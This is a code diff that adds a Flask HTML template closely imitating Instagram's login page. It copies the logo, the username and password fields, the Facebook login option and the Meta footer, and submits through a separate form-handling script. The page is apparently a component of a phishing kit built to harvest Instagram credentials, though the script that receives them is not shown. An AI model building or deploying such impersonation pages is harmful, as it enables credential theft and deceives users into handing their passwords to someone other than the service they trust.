@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="shortcut icon" href="{{ url_for('static', filename='images/instagram/instagram.ico') }}"
+        type="image/x-icon">
+    <link rel="stylesheet" href="{{ url_for('static', filename='styles/instagram.css') }}">
+</head>
+
+<body>
+    <div class="main">
+        <div class="container">
+            <div class="left">
+                <div>
+                    <img src="{{ url_for('static', filename='images/instagram/home-phones.png') }}" alt="home-phones">
+                    <img src="{{ url_for('static', filename='images/instagram/screenshot3.png') }}" alt="screenshot3">
+                </div>
+            </div>
+            <div class="right">
+
+                <form class="form" id="form">
+                    <div class="logo-image">
+                        <img src="{{ url_for('static', filename='images/instagram/logo.png') }}" alt="logo">
+                    </div>
+                    <div class="form-inputs">
+                        <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                        <input type="password" name="password" placeholder="Password" required>
+                        <button type="submit">Log in</button>
+                    </div>
+
+                    <div class="seperator-main">
+                        <div class="seperator"></div>
+                        <span>OR</span>
+                        <div class="seperator"></div>
+                    </div>
+
+                    <div class="fb-login">
+                        <img src="{{ url_for('static', filename='images/instagram/fb.svg') }}" alt="fb" width="16">
+                        <span>Log in with Facebook</span>
+                    </div>
+
+                    <div class="forgot-password">
+                        <span>Forgot password?</span>
+                    </div>
+                </form>
+
+                <div class="signup">
+                    <span>Don't have an account?</span>
+                    <span href="#">Sign up</span>
+                </div>
+
+                <div class="apps">
+                    <div>
+                        <span>Get the app.</span>
+                    </div>
+                    <div>
+                        <img src="{{ url_for('static', filename='images/instagram/c5Rp7Ym-Klz.png') }}"
+                            alt="c5Rp7Ym-Klz">
+                        <img src="{{ url_for('static', filename='images/instagram/EHY6QnZYdNX.png') }}"
+                            alt="EHY6QnZYdNX">
+                    </div>
+                </div>
+
+
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div>
+            <ul>
+                <li>Meta</li>
+                <li>About</li>
+                <li>Blog</li>
+                <li>Jobs</li>
+                <li>Help</li>
+                <li>API</li>
+                <li>Privacy</li>
+                <li>Terms</li>
+                <li>Locations</li>
+                <li>Instagram Lite</li>
+                <li>Threads</li>
+                <li>Contact Uploading & Non-Users</li>
+                <li>Meta Verified</li>
+            </ul>
+
+            <div class="copyright">
+                <span>English</span>
+                <span>© 2024 Instagram from Meta</span>
+            </div>
+        </div>
+    </div>
+    </div>
+    <script src="{{ url_for('static', filename='scripts/formHandler.js') }}"></script>
+</body>
+
+</html>
